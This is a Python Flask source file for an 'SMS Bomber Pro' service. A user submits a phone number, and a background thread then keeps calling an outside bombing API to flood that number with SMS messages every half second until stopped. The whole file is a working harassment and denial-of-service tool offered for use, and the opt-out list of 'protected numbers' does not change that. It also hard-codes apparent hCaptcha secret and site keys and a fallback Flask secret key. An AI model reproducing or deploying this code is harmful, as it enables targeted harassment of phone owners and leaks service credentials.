from flask import Flask, request, jsonify, session
import requests
import threading
import time
import json
import os
import uuid
import re
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'sms-bomber-secret-key-2024')

# Use Render's persistent disk if available, otherwise fallback
if os.path.exists('/opt/render/protected_data'):
    # Render persistent disk path
    PROTECTED_NUMBERS_FILE = '/opt/render/protected_data/protected_numbers.json'
    print("📁 Using Render persistent disk for storage")
else:
    # Local development path
    PROTECTED_NUMBERS_FILE = 'protected_numbers.json'
    print("📁 Using local file for storage")

# Global storage for protected numbers
protected_numbers = set()

# Store active sessions per user
user_sessions = {}

# hCaptcha configuration
HCAPTCHA_SECRET_KEY = "ES_595b1aa25093495f9374ddb1a010134f"
HCAPTCHA_SITE_KEY = "652c20cc-4e0c-486e-9cc4-d61a1d186b80"

# Updated Bombing API Configuration (NO AUTHENTICATION)
BOMBING_API_URL = "https://venom-1j8c.onrender.com"

def load_protected_numbers():
    """Load protected numbers from persistent storage"""
    global protected_numbers
    try:
        if os.path.exists(PROTECTED_NUMBERS_FILE):
            with open(PROTECTED_NUMBERS_FILE, 'r') as f:
                numbers = json.load(f)
                protected_numbers = set(numbers)
                print(f"✅ Loaded {len(protected_numbers)} protected numbers from storage")
        else:
            protected_numbers = set()
            print("📝 No protected numbers file found, starting fresh")
    except Exception as e:
        print(f"❌ Error loading protected numbers: {e}")
        protected_numbers = set()

def save_protected_numbers():
    """Save protected numbers to persistent storage"""
    try:
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(PROTECTED_NUMBERS_FILE), exist_ok=True)
        
        with open(PROTECTED_NUMBERS_FILE, 'w') as f:
            json.dump(list(protected_numbers), f, indent=2)
        print(f"💾 Saved {len(protected_numbers)} protected numbers to storage")
    except Exception as e:
        print(f"❌ Error saving protected numbers: {e}")

def verify_hcaptcha(hcaptcha_response):
    """Verify hCaptcha response"""
    if not hcaptcha_response:
        return False
    
    try:
        data = {
            'secret': HCAPTCHA_SECRET_KEY,
            'response': hcaptcha_response
        }
        
        response = requests.post('https://hcaptcha.com/siteverify', data=data, timeout=5)
        result = response.json()
        
        return result.get('success', False)
    except Exception as e:
        print(f"❌ hCaptcha verification error: {e}")
        return False

def normalize_phone_number(phone_number):
    """Normalize phone number"""
    if not phone_number:
        return ""
    normalized = re.sub(r'[^\d+]', '', phone_number)
    return normalized

def extract_base_number(phone_number):
    """Extract base number by removing country codes"""
    normalized = normalize_phone_number(phone_number)
    
    if not normalized:
        return ""
    
    if normalized.startswith('+'):
        normalized = normalized[1:]
    
    if len(normalized) > 10:
        base_number = normalized[-10:]
        if base_number.isdigit() and len(base_number) == 10:
            return base_number
    
    if len(normalized) == 10 and normalized.isdigit():
        return normalized
    
    if len(normalized) == 11 and normalized.startswith('0') and normalized[1:].isdigit():
        return normalized[1:]
    
    return normalized

def is_valid_phone_number(phone_number):
    """Validate phone number format"""
    if not phone_number:
        return False
    
    # Remove all non-digit characters except +
    cleaned = re.sub(r'[^\d+]', '', phone_number)
    
    # Check for empty string after cleaning
    if not cleaned:
        return False
    
    # Check for international format (starts with +)
    if cleaned.startswith('+'):
        # Remove the + for digit counting
        digits_only = cleaned[1:]
        # International numbers should have 10-15 digits after +
        if not digits_only.isdigit() or len(digits_only) < 10 or len(digits_only) > 15:
            return False
    
    # Check for local format (10 digits, may start with 0)
    elif cleaned.startswith('0'):
        # Local format with leading zero (e.g., 01234567890)
        if len(cleaned) == 11 and cleaned[1:].isdigit():
            return True
        else:
            return False
    
    else:
        # Simple 10-digit number
        if len(cleaned) == 10 and cleaned.isdigit():
            return True
        else:
            return False
    
    return True

def is_number_protected(phone_number):
    """Check if a phone number is protected"""
    base_number = extract_base_number(phone_number)
    
    if not base_number:
        return False
    
    for protected_num in protected_numbers:
        protected_base = extract_base_number(protected_num)
        if protected_base == base_number:
            return True
    
    return False

# Load protected numbers when server starts
load_protected_numbers()

class BombingSession:
    def __init__(self, phone_number, session_id, user_id):
        self.phone_number = phone_number
        self.session_id = session_id
        self.user_id = user_id
        self.is_running = False
        self.thread = None
        self.sent_count = 0
        self.start_time = None
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
        self.session = None
        self.last_sent_time = None
        self.has_ever_sent = False

    def start_bombing(self):
        self.is_running = True
        self.stop_event.clear()
        self.start_time = datetime.now()
        self.has_ever_sent = False
        
        # Create session WITHOUT API key authentication
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SMS-Bomber-Website/2.0',
            'Content-Type': 'application/json'
        })
        
        self.thread = threading.Thread(target=self._bombing_worker)
        self.thread.daemon = True
        self.thread.start()

    def stop_bombing(self):
        """IMMEDIATE FORCE STOP"""
        self.is_running = False
        self.stop_event.set()
        if self.session:
            self.session.close()

    def _bombing_worker(self):
        """Bombing worker WITHOUT API authentication"""
        while self.is_running and not self.stop_event.is_set():
            try:
                if self.stop_event.is_set():
                    break
                
                # Use the POST endpoint for bombing WITHOUT authentication
                payload = {'number': self.phone_number}
                response = self.session.post(
                    f"{BOMBING_API_URL}/bomb", 
                    json=payload,
                    timeout=5
                )
                
                if response.status_code == 200:
                    # Each successful request = 3 messages sent
                    messages_sent = 3
                    
                    with self.lock:
                        self.sent_count += messages_sent
                        self.last_sent_time = datetime.now()
                        self.has_ever_sent = True
                        print(f"✅ Sent messages to {self.phone_number} (Total: {self.sent_count})")
                        
                elif response.status_code == 400:
                    # Invalid number format
                    print(f"❌ Invalid number format: {self.phone_number}")
                elif response.status_code == 429:
                    # Rate limited
                    print("⏳ Rate limited, waiting...")
                    time.sleep(1)
                else:
                    print(f"❌ API returned status: {response.status_code}")
                    
            except requests.exceptions.RequestException as e:
                # Network errors are normal during bombing
                pass
            except Exception as e:
                print(f"❌ Bombing error: {e}")
            
            # Fast check for stop
            if self.stop_event.wait(0.5):
                break

    def get_status(self):
        if self.start_time:
            duration = datetime.now() - self.start_time
            duration_str = str(duration).split('.')[0]
        else:
            duration_str = "00:00:00"
        
        current_sending = self.has_ever_sent
        
        return {
            'phone_number': self.phone_number,
            'is_running': self.is_running,
            'sent_count': self.sent_count,
            'duration': duration_str,
            'session_id': self.session_id,
            'is_sending': current_sending
        }

def get_user_id():
    """Get or create unique user ID for each browser/device"""
    if 'user_id' not in session:
        session['user_id'] = str(uuid.uuid4())
    return session['user_id']

def has_active_session(user_id):
    """Check if user has active bombing session"""
    if user_id in user_sessions:
        session_obj = user_sessions[user_id]
        return session_obj.is_running
    return False

def get_user_session(user_id):
    """Get active session for user"""
    return user_sessions.get(user_id)

def set_user_session(user_id, session_obj):
    """Set session for user (ONLY ONE SESSION)"""
    user_sessions[user_id] = session_obj

def remove_user_session(user_id):
    """Remove user session"""
    if user_id in user_sessions:
        del user_sessions[user_id]

# Add CORS headers manually
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

# API Routes
@app.route('/api/start', methods=['POST'])
def start_bombing():
    try:
        user_id = get_user_id()
        data = request.get_json()
        phone_number = data.get('phone_number', '').strip()
        hcaptcha_response = data.get('hcaptcha_response', '')
        
        if not phone_number:
            return jsonify({'success': False, 'error': 'Phone number is required'})
        
        # Validate phone number format
        if not is_valid_phone_number(phone_number):
            return jsonify({'success': False, 'error': 'Invalid phone number format. Use 10-digit, 11-digit (starting with 0), or international format (+countrycode)'})
        
        # Check if user already has active session
        if has_active_session(user_id):
            return jsonify({'success': False, 'error': 'You already have an active session. Please stop it first.'})
        
        # Verify hCaptcha
        if not verify_hcaptcha(hcaptcha_response):
            return jsonify({'success': False, 'error': 'CAPTCHA verification failed'})
        
        # Check if number is protected
        if is_number_protected(phone_number):
            return jsonify({'success': False, 'error': 'This number is protected'})
        
        # Create new session
        session_id = str(int(time.time() * 1000))
        bombing_session = BombingSession(phone_number, session_id, user_id)
        bombing_session.start_bombing()
        
        set_user_session(user_id, bombing_session)
        return jsonify({'success': True, 'session_id': session_id})
    
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/stop', methods=['POST'])
def stop_bombing():
    try:
        user_id = get_user_id()
        
        session_obj = get_user_session(user_id)
        if session_obj:
            session_obj.stop_bombing()
            remove_user_session(user_id)
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'No active session found'})
    
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/session')
def get_session():
    """Get single active session for user"""
    user_id = get_user_id()
    session_obj = get_user_session(user_id)
    if session_obj:
        return jsonify(session_obj.get_status())
    else:
        return jsonify({})

@app.route('/api/has_active_session')
def has_active_session_route():
    """Check if user has active session"""
    user_id = get_user_id()
    return jsonify({'has_active_session': has_active_session(user_id)})

@app.route('/api/protect', methods=['POST'])
def protect_number():
    try:
        data = request.get_json()
        phone_number = data.get('phone_number', '').strip()
        
        if not phone_number:
            return jsonify({'success': False, 'error': 'Phone number is required'})
        
        # Validate phone number format
        if not is_valid_phone_number(phone_number):
            return jsonify({'success': False, 'error': 'Invalid phone number format. Use 10-digit, 11-digit (starting with 0), or international format (+countrycode)'})
        
        base_number = extract_base_number(phone_number)
        
        if not base_number:
            return jsonify({'success': False, 'error': 'Invalid phone number format'})
        
        protected_numbers.add(base_number)
        save_protected_numbers()
        
        return jsonify({'success': True, 'message': f'Number {base_number} protected successfully'})
    
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/protected-numbers')
def get_protected_numbers():
    return jsonify({
        'protected_numbers': list(protected_numbers),
        'count': len(protected_numbers)
    })

@app.route('/api/health')
def health_check():
    return jsonify({
        'status': 'healthy', 
        'timestamp': datetime.now().isoformat(),
        'protected_numbers_count': len(protected_numbers),
        'active_sessions': len(user_sessions)
    })

@app.route('/')
def home():
    return jsonify({
        'message': 'SMS Bomber Pro API',
        'version': '2.0',
        'status': 'running',
        'bombing_api': BOMBING_API_URL
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 4747))
    print("=" * 50)
    print("🚀 SMS Bomber Pro API Starting...")
    print(f"📍 Port: {port}")
    print(f"🌐 Bombing API: {BOMBING_API_URL}")
    print(f"📁 Storage: {PROTECTED_NUMBERS_FILE}")
    print(f"📱 Protected Numbers: {len(protected_numbers)}")
    print("🔓 Authentication: DISABLED")
    print("🎯 Mode: API Only (Frontend separated)")
    print("=" * 50)
    app.run(host='0.0.0.0', port=port, debug=False)
